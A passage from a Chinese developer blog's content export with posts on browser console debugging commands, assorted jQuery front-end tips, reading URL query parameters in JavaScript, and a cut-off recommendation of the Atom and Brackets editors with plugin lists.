</code></pre><blockquote><p>向控制台输出一条信息，它包括一个指向该行代码位置的超链接。</p></blockquote><h2 id="console-info-object"><a href="#console-info-object" class="headerlink" title="console.info(object)"></a>console.info(object)</h2><pre><code class="javascript">console.info(object[, object, …])
</code></pre><blockquote><p>向控制台输出一条信息，该信息包含一个表示”信息”的图标，和指向该行代码位置的超链接。</p></blockquote><h2 id="console-warn-object"><a href="#console-warn-object" class="headerlink" title="console.warn(object)"></a>console.warn(object)</h2><pre><code class="javascript">console.warn(object[, object, …])
</code></pre><blockquote><p>同 console.info()。区别是图标与样式不同。</p></blockquote><h2 id="console-error-object"><a href="#console-error-object" class="headerlink" title="console.error(object)"></a>console.error(object)</h2><pre><code class="javascript">console.error(object[, object, …])
</code></pre><blockquote><p>同 console.info()。区别是图标与样式不同。error 实际上和 throw new Error() 产生的效果相同，使用该语句时会向浏览器抛出一个 JavaScript 异常。</p></blockquote><h1 id="console-group-object"><a href="#console-group-object" class="headerlink" title="console.group(object)"></a>console.group(object)</h1><blockquote><p>如果信息太多，可以分组显示，用到的方法是 console.group() 和 console.groupEnd()。</p></blockquote><pre><code class="javascript">console.group(&#39;第一组信息&#39;);
  console.log(&#39;第一组第一条&#39;);
  console.log(&#39;第一组第二条&#39;);
console.groupEnd();

console.group(&#39;第二组信息&#39;);
  console.log(&#39;第二组第一条&#39;);
  console.log(&#39;第二组第二条&#39;);
console.groupEnd();
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-4.png" alt="分组显示信息"></p><blockquote><p>console.groupCollapsed() 跟 console.group() 相同，区别在于嵌套块默认是收起的。</p></blockquote><h1 id="console-dir-object"><a href="#console-dir-object" class="headerlink" title="console.dir(object)"></a>console.dir(object)</h1><blockquote><p>console.dir() 可以显示一个对象所有的属性和方法（输出结果类似于 DOM 面板中的样式）。</p></blockquote><pre><code class="javascript">var dog = {};
dog.name = &#39;大毛&#39;;
dog.color = &#39;黄色&#39;;
dog.bark = function(){alert(&#39;汪汪汪&#39;);};
console.dir(dog);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-5.png" alt="console.dir"></p><h1 id="console-dirxml-node"><a href="#console-dirxml-node" class="headerlink" title="console.dirxml(node)"></a>console.dirxml(node)</h1><blockquote><p>console.dirxml() 用来显示网页的某个节点（node）所包含的 html/xml 代码。</p></blockquote><pre><code class="javascript">var footer = document.getElementById(&#39;footer&#39;);
console.dirxml(footer);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-6.png" alt="console.dirxml"></p><h1 id="console-assert-expression"><a href="#console-assert-expression" class="headerlink" title="console.assert(expression)"></a>console.assert(expression)</h1><blockquote><p>断言，测试一条表达式是否为真，不为真时将抛出异常（断言失败），为真则不抛出异常（断言成功）。</p></blockquote><pre><code class="javascript">var result = 0;
console.assert(result);
var year = 2016;
console.assert(year == 2015);
var i = 5, j = 6;
console.assert(i&lt;j);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-7.png" alt="console.assert"></p><h1 id="console-trace"><a href="#console-trace" class="headerlink" title="console.trace()"></a>console.trace()</h1><blockquote><p>console.trace() 输出 JavaScript 执行时的堆栈追踪。</p></blockquote><p>比如，有一个加法器函数。</p><pre><code class="javascript">function add(a,b){
  return a+b;
}
</code></pre><p>我想知道这个函数是如何被调用的，在其中加入 <code>console.trace()</code> 方法就可以了。</p><pre><code class="javascript">function add(a,b){
  console.trace();
  return a+b;
}
</code></pre><p>假定这个函数的调用代码如下：</p><pre><code class="javascript">var x = add3(1,1);

function add3(a,b){return add2(a,b);}

function add2(a,b){return add1(a,b);}

function add1(a,b){return add(a,b);}
</code></pre><blockquote><p>运行后，会显示 <code>add()</code> 的调用轨迹，从上到下依次为 <code>add()</code>、 <code>add1()</code>、 <code>add2()</code>、 <code>add3()</code>。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-8.png" alt="console.trace"></p><h1 id="console-time-name"><a href="#console-time-name" class="headerlink" title="console.time(name)"></a>console.time(name)</h1><blockquote><p>console.time() 和 console.timeEnd()，用来显示代码的运行时间。当调用 console.timeEnd(name);并传递相同的 name 为参数时，计时停止，并输出执行两条语句之间代码所消耗的时间（毫秒）。</p></blockquote><pre><code class="javascript">console.time(&#39;time&#39;);

for(var i=0;i&lt;1000;i++){
  for(var j=0;j&lt;1000;j++){}
}

console.timeEnd(&#39;time&#39;);
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/debug-console-9.png" alt="console.time"></p><blockquote><p>注： console.time(slugName) – console.timeEnd(slugName) 记录某一个 javascript 程序的执行时间，可用于优化循环语句</p></blockquote><h1 id="console-clear"><a href="#console-clear" class="headerlink" title="console.clear()"></a>console.clear()</h1><blockquote><p>清空控制台</p></blockquote><h1 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h1><blockquote><p>控制台除了可以运行常规的 javascript 代码，还内置了相当数量的命令行可以辅助我们的调试工作，</p></blockquote><h2 id="id"><a href="#id" class="headerlink" title="$(id)"></a>$(id)</h2><blockquote><p>返回一个给定 id 的元素。无需引用 jQuery，不可与 jQuery 的方法混用。</p></blockquote><h2 id="selector"><a href="#selector" class="headerlink" title="$$(selector)"></a>$$(selector)</h2><blockquote><p>返回给定的 css 选择器匹配到的一组元素。</p></blockquote><h2 id="x-xpath"><a href="#x-xpath" class="headerlink" title="$x(xpath)"></a>$x(xpath)</h2><blockquote><p>返回给定的 XPath 表达式匹配到的一组元素。</p></blockquote><h2 id="0"><a href="#0" class="headerlink" title="$0"></a>$0</h2><blockquote><p>返回在 HTML 面板中选中的元素。</p></blockquote><h2 id="1"><a href="#1" class="headerlink" title="$1"></a>$1</h2><blockquote><p>返回上一次在 HTML 面板中选中的元素。</p></blockquote><h2 id="n-index"><a href="#n-index" class="headerlink" title="$n(index)"></a>$n(index)</h2><blockquote><p>返回访问最近 5 个被选中过的元素，index 的范围： 0 – 4。</p></blockquote><h2 id="dir-object"><a href="#dir-object" class="headerlink" title="dir(object)"></a>dir(object)</h2><blockquote><p>同 console.dir(object)。</p></blockquote><h2 id="dirxml-node"><a href="#dirxml-node" class="headerlink" title="dirxml(node)"></a>dirxml(node)</h2><blockquote><p>同 console.dirxml(node)。</p></blockquote><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><blockquote><p>同 console.clear()。</p></blockquote><h2 id="inspect-object-tabName"><a href="#inspect-object-tabName" class="headerlink" title="inspect(object[, tabName])()"></a>inspect(object[, tabName])()</h2><blockquote><p>在合适的（或一个指定的） tab 中检视一个对象。</p></blockquote><h2 id="keys-object"><a href="#keys-object" class="headerlink" title="keys(object)"></a>keys(object)</h2><blockquote><p>返回一个对象的所有属性的键。</p></blockquote><h2 id="values-object"><a href="#values-object" class="headerlink" title="values(object)"></a>values(object)</h2><blockquote><p>返回一个对象的所有属性的值。</p></blockquote><h2 id="debug-fn"><a href="#debug-fn" class="headerlink" title="debug(fn)"></a>debug(fn)</h2><blockquote><p>在函数第一行添加一个断点，使用 undebug(fn) 移除断点。</p></blockquote><h2 id="monitor-fn"><a href="#monitor-fn" class="headerlink" title="monitor(fn)"></a>monitor(fn)</h2><blockquote><p>开启一个函数的调用日志，使用 unmonitor(fn) 关闭该功能。非常有用的一个命令，但是它似乎并没有很好地工作。</p></blockquote><h2 id="monitorEvents-object-types"><a href="#monitorEvents-object-types" class="headerlink" title="monitorEvents(object[, types])"></a>monitorEvents(object[, types])</h2><blockquote><p>开启一个元素的某个事件（或所有事件）被触发时的日志记录。用例如下：</p></blockquote><h2 id="monitorEvents-0-‘click’"><a href="#monitorEvents-0-‘click’" class="headerlink" title="monitorEvents($0,[‘click’])"></a>monitorEvents($0,[‘click’])</h2><blockquote><p>上面的命令行被执行后，将开启当前在 HTML 面板中被选中元素的 click 事件监控，一旦这个元素的 click 事件被触发，事件对象将会在控制台输出。如果不指定第二个参数，将对所有事件进行记录。</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> debug </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Debug </tag>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[简单而实用的 jQuery 小技巧]]></title>
      <url>/2016/08/some-tips-for-jquery/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>简单的窍门的集合，用来帮助你 jQuery 代码的进阶<a id="more"></a></p><h1 id="判断-jQuery-是否被正确加载"><a href="#判断-jQuery-是否被正确加载" class="headerlink" title="判断 jQuery 是否被正确加载"></a>判断 jQuery 是否被正确加载</h1><blockquote><p>在用 jQuery 来写一些脚本时， jQuery 必须要被正确加载，接下来写的脚本才有意义。</p></blockquote><pre><code class="javascript">if (typeof jQuery == &#39;undefined&#39;) {
  console.log(&#39;jQuery hasn\&#39;t loaded&#39;);
} else {
  console.log(&#39;jQuery has loaded&#39;);
}
</code></pre><h1 id="禁用右键功能"><a href="#禁用右键功能" class="headerlink" title="禁用右键功能"></a>禁用右键功能</h1><pre><code class="javascript">$(function(){
  $(document).bind(&quot;contextmenu&quot;,function(e){
    return false;
  });
});
</code></pre><h1 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h1><blockquote><p>利用 jQuery 里的 animate 和 scrollTop 方法，你便不需要使用插件创建简单的滚动到顶部动画。</p></blockquote><p><code>javascript 代码</code></p><pre><code class="javascript">// Back to top
$(&#39;.top&#39;).click(function (e) {
  e.preventDefault(); // 阻止元素的默认行为
  $(&#39;html, body&#39;).animate({scrollTop: 0}, 800); // 用多长时间滚动到何处
});
</code></pre><p><code>html 代码</code></p><pre><code class="html">&lt;!-- Create an anchor tag --&gt;
&lt;a class=&quot;top&quot; href=&quot;#&quot;&gt;Back to top&lt;/a&gt;
</code></pre><blockquote><p>通过 scrollTop 的值来改变你想要滚动到的位置。其实你就是做了：在接下来的 800 毫秒中让页面滚动，直到它滚动到文档的顶部。</p></blockquote><h1 id="一句话搞定-checkbox-全选和全不选"><a href="#一句话搞定-checkbox-全选和全不选" class="headerlink" title="一句话搞定 checkbox 全选和全不选"></a>一句话搞定 checkbox 全选和全不选</h1><blockquote><p>在网站建设中；让复选框全部选中和全部取消是比较常用的；下面就介绍如何用一句话搞定全选功能。</p></blockquote><p><code>javascript 代码</code></p><pre><code class="javascript">function checkAll(obj){
  $(&quot;#box input[type=&#39;checkbox&#39;]&quot;).prop(&#39;checked&#39;, $(obj).prop(&#39;checked&#39;));
}
</code></pre><p><code>html 代码</code></p><pre><code class="html">&lt;div id=&quot;box&quot;&gt;
  &lt;input type=&quot;checkbox&quot; onclick=&quot;checkAll(this)&quot;&gt;全选&lt;br&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt;
&lt;/div&gt;
</code></pre><h1 id="图片的预加载"><a href="#图片的预加载" class="headerlink" title="图片的预加载"></a>图片的预加载</h1><blockquote><p>如果你的网页使用了很多隐藏图片文件（例如：鼠标悬停展示的图片），那么图片的预加载是有意义的。</p></blockquote><pre><code class="javascript">// 扫描网站上的图片
$.preloadImages = function () {
  for (var i = 0; i &lt; arguments.length; i++) {
    $(&#39;&lt;img&gt;&#39;).attr(&#39;src&#39;, arguments[i]);
  }
};

// 预加载
$.preloadImages(&#39;img/hover-on.png&#39;, &#39;img/hover-off.png&#39;);
</code></pre><h1 id="判断图片是否加载完"><a href="#判断图片是否加载完" class="headerlink" title="判断图片是否加载完"></a>判断图片是否加载完</h1><blockquote><p>有时候你可能需要检查图像是否已经加载完成，以便于可以继续执行相应的 JavaScript 代码。</p></blockquote><pre><code class="javascript">$(&#39;img&#39;).load(function () {
  console.log(&#39;image load successful&#39;);
});
</code></pre><blockquote><p>你还可以检查一个特定的图片是否加载，只需引用该 img 标签的 class 或者 id。</p></blockquote><h1 id="自动修补破损图像"><a href="#自动修补破损图像" class="headerlink" title="自动修补破损图像"></a>自动修补破损图像</h1><blockquote><p>如果你碰巧发现在你的网站上发现破损的图像链接，一个个去替代他们是痛苦的。这个简单的代码可以节省很多的麻烦。</p></blockquote><pre><code class="javascript">$(&#39;img&#39;).on(&#39;error&#39;, function () {
  if(!$(this).hasClass(&#39;broken-image&#39;)) {
    $(this).prop(&#39;src&#39;, &#39;img/broken.png&#39;).addClass(&#39;broken-image&#39;);
  }
});
</code></pre><blockquote><p>即使你没有任何断开的链接，加入这代码也不会有任何影响。</p></blockquote><h1 id="hover-切换-class-类"><a href="#hover-切换-class-类" class="headerlink" title="hover 切换 class 类"></a>hover 切换 class 类</h1><blockquote><p>比方说，当用户将鼠标悬停在你页面上的元素时，你想改变其视觉效果。当用户鼠标悬停在元素上，你可以在该元素上添加一个 class 类，当鼠标停止悬停事件时移除此 class 类。</p></blockquote><pre><code class="javascript">$(&#39;.btn&#39;).hover(function () {
  $(this).addClass(&#39;hover&#39;);
}, function () {
  $(this).removeClass(&#39;hover&#39;);
});
</code></pre><blockquote><p>如果你想要一个更简单的方式使用 toggleClass 方法，则仅仅需要添加必要的 CSS。</p></blockquote><pre><code class="javascript">$(&#39;.btn&#39;).hover(function () {
  $(this).toggleClass(&#39;hover&#39;);
});
</code></pre><blockquote><p>备注：CSS 在这种情况下使用是一个快速的解决方案，但要知道这点知识依旧是值得去了解下的。</p></blockquote><h1 id="禁用输入"><a href="#禁用输入" class="headerlink" title="禁用输入"></a>禁用输入</h1><blockquote><p>有时你可能需要用表单的提交按钮或者某个输入框直到用户执行了某个动作（比如：检查”我已阅读条款”复选框）。在你的输入框上设置disabled属性，然后当你需要的时候启用该属性。</p></blockquote><pre><code class="javascript">$(&#39;input[type=&quot;submit&quot;]&#39;).prop(&#39;disabled&#39;, true);
</code></pre><blockquote><p>你需要做的只是需要在输入框上再次运行prop方法，但设置的被禁用值是false。</p></blockquote><pre><code class="javascript">$(&#39;input[type=&quot;submit&quot;]&#39;).prop(&#39;disabled&#39;, false);
</code></pre><h1 id="停止正在加载的链接"><a href="#停止正在加载的链接" class="headerlink" title="停止正在加载的链接"></a>停止正在加载的链接</h1><blockquote><p>有时你不想链接到特定的网页或者重新载入页面；你可能想让他们做一些其他事情，如触发一些其他的脚本。这是防止违约行动的技巧。</p></blockquote><pre><code class="javascript">$(&#39;a.no-link&#39;).click(function (e) {
  e.preventDefault();
});
</code></pre><h1 id="限制-Text-Area-域中的字符的个数"><a href="#限制-Text-Area-域中的字符的个数" class="headerlink" title="限制 Text-Area 域中的字符的个数"></a>限制 Text-Area 域中的字符的个数</h1><pre><code class="javascript">jQuery.fn.maxLength = function(max){
  return this.each(function(){
    var type = this.tagName.toLowerCase();  // 获取当前的标签名
    var inputType = this.type? this.type.toLowerCase() : null;  // 获取当前标签的类型
    if(type == &quot;input&quot; &amp;&amp; inputType == &quot;text&quot; || inputType == &quot;password&quot;){
      this.maxLength = max; // 设置最大值
    } else if(type == &quot;textarea&quot;){
      // 利用键盘事件，阻止继续输入字符
      this.onkeypress = function(e){
        var ob = e || event;
        var keyCode = ob.keyCode;
        var hasSelection = document.selection? document.selection.createRange().text.length &gt; 0 : this.selectionStart != this.selectionEnd;
        return !(this.value.length &gt;= max &amp;&amp; (keyCode &gt; 50 || keyCode == 32 || keyCode == 0 || keyCode == 13) &amp;&amp; !ob.ctrlKey &amp;&amp; !ob.altKey &amp;&amp; !hasSelection);
      };
      this.onkeyup = function(){
        if(this.value.length &gt; max){
          this.value = this.value.substring(0,max);
        }
      };
    }
  });
};
//用法
$(&#39;#mytextarea&#39;).maxLength(500);
</code></pre><h1 id="toggle-fade-slide"><a href="#toggle-fade-slide" class="headerlink" title="toggle fade/slide"></a>toggle fade/slide</h1><blockquote><p>滑动和淡入/淡出 是我们在 jQuery 中经常大量使用的动画。你可能仅仅想在用户做某些点击事件的时候显示一个元素，这时候需要淡入/淡出或者滑动方法。但是如果你需要那个元素在你第一次点击的时候出现，在第二次点击的时候消失，代码如下。</p></blockquote><pre><code class="javascript">// Fade
$(&#39;.btn&#39;).click(function () {
  $(&#39;.element&#39;).fadeToggle(&#39;slow&#39;);
});

// Toggle
$(&#39;.btn&#39;).click(function () {
  $(&#39;.element&#39;).slideToggle(&#39;slow&#39;);
});
</code></pre><h1 id="简单的手风琴"><a href="#简单的手风琴" class="headerlink" title="简单的手风琴"></a>简单的手风琴</h1><blockquote><p>这是个简单快速的方法创建一个手风琴。</p></blockquote><pre><code class="javascript">// Close all panels
$(&#39;#accordion&#39;).find(&#39;.content&#39;).hide();

// Accordion
$(&#39;#accordion&#39;).find(&#39;.accordion-header&#39;).click(function () {
  var next = $(this).next();
  next.slideToggle(&#39;fast&#39;);
  $(&#39;.content&#39;).not(next).slideUp(&#39;fast&#39;);
  return false;
});
</code></pre><blockquote><p>通过添加这个脚本，你需要做的则是必要的 HTML 操作在你的页面上。</p></blockquote><h1 id="使两个-DIV-同等高度"><a href="#使两个-DIV-同等高度" class="headerlink" title="使两个 DIV 同等高度"></a>使两个 DIV 同等高度</h1><blockquote><p>有时你会想要两个DIV有相同的高度，无论他们都有什么内容.</p></blockquote><pre><code class="javascript">$(&#39;.div&#39;).css(&#39;min-height&#39;, $(&#39;.main-div&#39;).height());
</code></pre><blockquote><p>这个例子设置了 DIV 的最小高度，这意味着它的高度只可以比这个设置的高度大而不能小。然而，一个更灵活的方法是循环的一组元素，并设置将最高元素的高度作为高度。</p></blockquote><pre><code class="javascript">var $columns = $(&#39;.column&#39;);
var height = 0;
$columns.each(function () {
  if ($(this).height() &gt; height) {
    height = $(this).height();
  }
});
$columns.height(height);
</code></pre><blockquote><p>如果你想要所有的列有相同的高度。</p></blockquote><pre><code class="javascript">var $rows = $(&#39;.same-height-columns&#39;);
$rows.each(function () {
  $(this).find(&#39;.column&#39;).height($(this).height());
});
</code></pre><h1 id="在浏览器标签-新窗口打开外部链接"><a href="#在浏览器标签-新窗口打开外部链接" class="headerlink" title="在浏览器标签 / 新窗口打开外部链接"></a>在浏览器标签 / 新窗口打开外部链接</h1><blockquote><p>在新的浏览器标签或窗口中打开外部链接，并确保在同一个标签或窗口中打开的是同一个源的链接。</p></blockquote><pre><code class="javascript">$(&#39;a[href^=&quot;http&quot;]&#39;).attr(&#39;target&#39;, &#39;_blank&#39;);
$(&#39;a[href^=&quot;//&quot;]&#39;).attr(&#39;target&#39;, &#39;_blank&#39;);
$(&#39;a[href^=&quot;&#39; + window.location.origin + &#39;&quot;]&#39;).attr(&#39;target&#39;, &#39;_self&#39;);
</code></pre><blockquote><p>备注：window.location.origin 在 IE10 不工作。</p></blockquote><h1 id="根据文本获取元素"><a href="#根据文本获取元素" class="headerlink" title="根据文本获取元素"></a>根据文本获取元素</h1><blockquote><p>通过 jQuery 中的contains()选择器，你能找到一个元素内的文本内容。如果文本不存在，则这个元素将被隐藏。通常用于站内搜素。</p></blockquote><pre><code class="javascript">var search = $(&#39;#search&#39;).val();
$(&#39;div:not(:contains(&quot;&#39; + search + &#39;&quot;))&#39;).hide();
</code></pre><h1 id="可见变化的触发"><a href="#可见变化的触发" class="headerlink" title="可见变化的触发"></a>可见变化的触发</h1><blockquote><p>当用户不再聚焦或者重新聚焦一个标签时触发 javascript 脚本。</p></blockquote><pre><code class="javascript">$(document).on(&#39;visibilitychange&#39;, function (e) {
  if (e.target.visibilityState === &quot;visible&quot;) {
    console.log(&#39;Tab is now in view!&#39;);
  } else if (e.target.visibilityState === &quot;hidden&quot;) {
    console.log(&#39;Tab is now hidden!&#39;);
  }
});
</code></pre><h1 id="Ajax-调用错误处理"><a href="#Ajax-调用错误处理" class="headerlink" title="Ajax 调用错误处理"></a>Ajax 调用错误处理</h1><blockquote><p>当一个 Ajax 调用返回一个 404 或 500 的错误时，将执行该错误处理。如果该处理未定义，则其他 jQuery 代码便可能不会执行了。定义一个全局 Ajax 错误处理程序。</p></blockquote><pre><code class="javascript">$(document).ajaxError(function (e, xhr, settings, error) {
  console.log(error);
});
</code></pre><h1 id="解决-jQuery-prototype-共存冲突问题"><a href="#解决-jQuery-prototype-共存冲突问题" class="headerlink" title="解决 jQuery, prototype 共存冲突问题"></a>解决 jQuery, prototype 共存冲突问题</h1><pre><code class="html">&lt;script src=&quot;prototype.js&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;jquery.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
  jQuery.noConflict();
&lt;/script&gt;
</code></pre><blockquote><p>注意：一定要先引入 prototype.js 再引入 jquery.js，先后顺序不可错</p></blockquote><h1 id="链式操作"><a href="#链式操作" class="headerlink" title="链式操作"></a>链式操作</h1><blockquote><p>jQuery 允许通过链式操作来减轻反复查询DOM和创建多个 jQuery 对象的过程。比如下面是你的方法调用。</p></blockquote><pre><code class="javascript">$(&#39;#elem&#39;).show();
$(&#39;#elem&#39;).html(&#39;bla&#39;);
$(&#39;#elem&#39;).otherStuff();
</code></pre><blockquote><p>这代码可以通过链式大大的提高。</p></blockquote><pre><code class="javascript">$(&#39;#elem&#39;)
  .show()
  .html(&#39;bla&#39;)
  .otherStuff();
</code></pre><blockquote><p>另一个方法是在一个可变的元素缓存（$ 作为前置）。</p></blockquote><pre><code class="javascript">var $elem = $(&#39;#elem&#39;);
$elem.hide();
$elem.html(&#39;bla&#39;);
$elem.otherStuff();
</code></pre><blockquote><p>链式和 jQuery 缓存方法是最好的做法，导致更短、更快的代码。</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Code </tag>
            
            <tag> jQuery </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript 获取 URL 请求参数]]></title>
      <url>/2016/08/js-get-url-request/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>通过 JavaScript 原生方法，获取 URL 所带的请求参数备用<a id="more"></a></p><h1 id="方法一-使用正则表达式匹配"><a href="#方法一-使用正则表达式匹配" class="headerlink" title="方法一(使用正则表达式匹配)"></a>方法一(使用正则表达式匹配)</h1><h2 id="方法源码"><a href="#方法源码" class="headerlink" title="方法源码"></a>方法源码</h2><pre><code class="javascript">function GetValue(name) {
  var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
  var r = window.location.search.substr(1).match(reg);
  if (r != null) return unescape(r[2]);
  return null;
}
</code></pre><h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><p>若地址栏URL为： <code>abc.html?id=1234&amp;&amp;url=//www.baidu.com</code> 则</p><pre><code class="javascript">console.log(GetValue(&#39;id&#39;));
</code></pre><p>输出 =&gt; <code>123</code></p><pre><code class="javascript">console.log(GetValue(&#39;url&#39;));
</code></pre><p>输出 =&gt; <code>//www.baidu.com</code></p><h1 id="方法二（普通字符串截取）"><a href="#方法二（普通字符串截取）" class="headerlink" title="方法二（普通字符串截取）"></a>方法二（普通字符串截取）</h1><h2 id="方法源码-1"><a href="#方法源码-1" class="headerlink" title="方法源码"></a>方法源码</h2><pre><code class="javascript">function GetRequest() {
  var url = location.search;
  var theRequest = new Object();
  if (url.indexOf(&quot;?&quot;) != -1) {
    var str = url.substr(1);
    strs = str.split(&quot;&amp;&quot;);
    for(var i = 0; i &lt; strs.length; i ++) {
      theRequest[strs[i].split(&quot;=&quot;)[0]]=(strs[i].split(&quot;=&quot;)[1]);
    }
  }
  return theRequest;
}
</code></pre><h2 id="如何使用？-1"><a href="#如何使用？-1" class="headerlink" title="如何使用？"></a>如何使用？</h2><pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;
  var Request = new Object();
  Request = GetRequest();
&lt;/script&gt;
</code></pre><p>若地址栏URL为： <code>abc.html?id=1234&amp;&amp;url=//www.baidu.com</code> 则</p><pre><code class="javascript">console.log(Request[&#39;id&#39;]);
</code></pre><p>输出=&gt; <code>123</code></p><pre><code class="javascript">console.log(Request[&#39;url&#39;]);
</code></pre><p>输出 =&gt; <code>//www.baidu.com</code></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Code </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[需要一款称手的编辑器]]></title>
      <url>/2016/08/need-a-super-software/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>以下介绍的编辑器是跨平台，无论是 Windows，还是 Liunx，甚至是 Mac，都可以成为程序员称手的利器<a id="more"></a></p><h1 id="Atom"><a href="#Atom" class="headerlink" title="Atom"></a>Atom</h1><blockquote><p>开源。功能强大，是 Github 团队推出的简洁编辑器，自带 <code>Node.js</code> 环境。</p></blockquote><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><blockquote><p>官网下载地址：<a href="//github.com/atom/atom/releases">Atom</a><br><br>官网下载地址下不下来点击以下链接下载：<a href="http://oaq0p7t2g.bkt.clouddn.com/atom-amd64.deb?attname=" target="_blank" rel="external">atom-amd64.deb</a> <a href="http://oaq0p7t2g.bkt.clouddn.com/AtomSetup.exe?attname=" target="_blank" rel="external">AtomSetup.exe</a></p></blockquote><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><blockquote><p>使用 <code>Ctrl+,</code> 调出设置页面，在 <code>install</code> 中查询插件并安装。自带 <code>Node.js</code> 环境。部分插件支持自定义设置。</p></blockquote><h3 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h3><ul><li><strong>emmet</strong> =&gt; 前端开发者必备</li><li><strong>atom-beautify</strong> =&gt; 格式化编程语言文件，支持的语法较广，如 <code>PHP</code>、<code>Python</code>、<code>Ruby</code>、<code>Java</code>、<code>C</code> 等</li><li><strong>atom-html-perview</strong> =&gt; <code>html</code> 文件实时预览</li><li><strong>atom-minify</strong> =&gt; 压缩 <code>Html</code>、<code>CSS</code>文件</li><li><strong>autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li><li><strong>csscomb</strong> =&gt; <code>CSS</code> 属性自动排序</li><li><strong>docblockr</strong> =&gt; 可以自动生成 <code>PHPDoc</code> 风格的注释</li><li><strong>atom-ternjs</strong> =&gt; <code>javascript</code> 代码提示</li><li><strong>autocomplete-paths</strong> =&gt; 引入文件时，自动补全路径</li><li><strong>language-markdown</strong> =&gt; <code>markdown</code> 文件语法高亮</li><li><strong>language-vue</strong> =&gt; <code>vue</code> 文件语法高亮</li><li><strong>logo-file-icons</strong> =&gt; 文件图标</li><li><strong>markdown-scroll-sync</strong> =&gt; <code>markdown</code> 文件预览自动滚动</li><li><strong>simplified-chinese-menu</strong> =&gt; <code>Atom</code> 简体中文语言包</li><li><strong>vue-autocomplete</strong> =&gt; <code>vue</code> 文件代码自动提示</li><li><strong>vue-format</strong> =&gt; <code>vue</code> 文件自动格式化</li></ul><h1 id="Brackets"><a href="#Brackets" class="headerlink" title="Brackets"></a>Brackets</h1><blockquote><p>开源。功能强大，是一个非常优秀的 <code>WEB</code> 设计和前端开发的源代码编辑器。当然也支持 <code>C</code>、 <code>Java</code>、 <code>Python</code> 等编程语言。支持实时预览。自带 <code>Node.js</code> 环境。</p></blockquote><h2 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h2><blockquote><p><a href="//github.com/adobe/brackets/releases">Brackets</a><br><br>官网下载地址下不下来点击以下链接下载：<a href="http://oaq0p7t2g.bkt.clouddn.com/Brackets.Release.1.8.msi?attname=" target="_blank" rel="external">Brackets.Release.1.8.msi</a><br><br><a href="http://oaq0p7t2g.bkt.clouddn.com/Brackets.Release.1.8.64-bit.deb?attname=" target="_blank" rel="external">Brackets.Release.1.8.64-bit.deb</a></p></blockquote><h2 id="安装插件-1"><a href="#安装插件-1" class="headerlink" title="安装插件"></a>安装插件</h2><blockquote><p>部分插件是使用国外源的，很容易被墙的。所以系统最好要有个代理服务器，这里推荐 <a href="//www.gaotizi.com/aff.php?aff=133">高梯子</a>。</p></blockquote><h3 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h3><blockquote><p>最快速的安装 <code>Bracket</code>s 扩展的方法是使用扩展管理器（<code>Extension Manager</code>）– 直接在 <code>Brackets</code> 的工具栏选择 <code>File &gt; Extension Manager</code> 即可。</p></blockquote><h3 id="修改界面语言"><a href="#修改界面语言" class="headerlink" title="修改界面语言"></a>修改界面语言</h3><blockquote><p>改成中文。 Debug-&gt;Switch Language</p></blockquote><h3 id="插件推荐-1"><a href="#插件推荐-1" class="headerlink" title="插件推荐"></a>插件推荐</h3><ul><li><strong>Emmet</strong> =&gt; 前端开发者必备</li><li><strong>Autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li><li><strong>CSScomb</strong> =&gt; <code>CSS</code> 属性自动排序</li><li><strong>Brackets Icons</strong> =&gt; 为你的 <code>Brackets</code> 